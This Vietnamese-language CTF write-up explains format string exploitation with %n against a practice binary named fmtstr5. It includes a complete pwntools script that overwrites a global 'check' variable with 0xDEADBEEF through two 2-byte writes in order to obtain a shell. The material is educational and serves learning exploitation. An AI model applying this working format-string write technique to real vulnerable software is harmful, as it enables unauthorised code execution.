# Format String - Ghi dữ liệu bằng %n

Ta đã biết qua các format string **%p và %s**, đây là loại cuối cùng mà ta thường dùng khi khai thác: **%n**. Các format string ở các video trước được dùng để leak dữ liệu nhưng với **%n**, **ta có thể dùng nó để ghi dữ liệu ở bất cứ nơi đâu miễn sao ta biết được địa chỉ cần ghi và địa chỉ đó phải nằm trên stack**

**ida:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/059b99b0-5633-406e-8490-19bbd0b0e867)


bài này nhìn phát biết lỗi fmtstr rồi

để lấy được shell ta cần địa chỉ của biến **check** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/3e216cb6-3471-4265-9441-34c4b5ca2dd4)


**có được địa chỉ của biến check ta cần gán biến check bằng 0xDEADBEEFLL** 

**phân tích :** 
- mục tiêu của ta là làm giá trị chỉ biến check là 0xDEADBEEFLL, biến check thì ko nằm trên stack thì nên ta cần gán địa chỉ của check vào trong stack
- %p và %s đều có tác dụng ra in và leak ra dữ liệu trong stack hoặc con trỏ nên nếu ta dùng %p hay %s ở bài này là điều ko thể
- hướng duy nhất ta có khai thác là sử dụng %n, vì ta có thể dùng nó để ghi dữ liệu ở bất cứ nơi đâu miễn sao ta biết được địa chỉ cần ghi và địa chỉ đó phải nằm trên stack

**ở bài này ta cần %n 2 lần vì 0xDEADBEEF 4byte là rất lớn, nếu in ra 1 lần thì chương trình sẽ bị lỗi ko nhận được, nên ta sẽ %n 2 lần , lần 1 in 0xBEEF, lần 2 in 0xDEAD, mỗi lần 2byte.**

bonus:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/b602d563-de3e-498d-8637-a4b0683ecbdb)


(trong script có giải thích nha)

**script:**

```
from pwn import *

p = process('./fmtstr5')
exe = ELF('./fmtstr5')

check_addr = 0x404090

gdb.attach(p, gdbscript = '''
b*main+112
c
'''
)

input()


payload = f'%{0xbeef}c%10$n'.encode() #in lần 1 0xbeef
# vì lần đầu ta đã in 0xbeef rồi, nếu lần 2 ta in 0xdead thì %n nó hiểu là sẽ cộng dồn 0xbeef + 0xdead và ko đúng ta cần
# nên lần 2 ta sẽ in (0xdead - 0xbeef) = 0x1fbe 
payload += f'%{0xdead - 0xbeef}c%11$n'.encode()  #in lần 2 0xdead
payload = payload.ljust(0x20, b'P') #nên dùng ljust vì trong quá trình debug ta sẽ thay đổi payload nhiều lần, dùng ljust giúp ta cố định được check_addr tại 1 stack cố định
payload += p64(check_addr) #2 byte đầu 0xbeef
payload += p64(check_addr + 2) #2 byte sau 0xdead


p.sendlineafter(b'string: ', payload)

p.interactive()
```
